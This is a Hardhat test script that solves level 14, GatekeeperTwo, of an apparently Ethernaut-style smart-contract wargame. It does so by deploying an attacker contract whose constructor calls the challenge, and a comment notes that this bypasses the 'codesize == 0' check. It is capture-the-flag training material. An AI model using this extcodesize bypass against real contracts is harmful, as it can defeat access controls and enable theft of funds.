const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("GatekeeperTwo");
  // Since this challenge is created by the challengeFactory, we cannot tackle the gates one by one.
  const challengeAddress = await createChallenge(`0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 14-GatekeeperTwo", async function () {
  const challenge = await getChallenge();
  const factory = await ethers.getContractFactory("GatekeeperTwoAttacker");

  // Attacking within the constructor bypasses the `codesize == 0` check.
  const contract = await factory.deploy(await challenge.getAddress());
  await contract.waitForDeployment();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
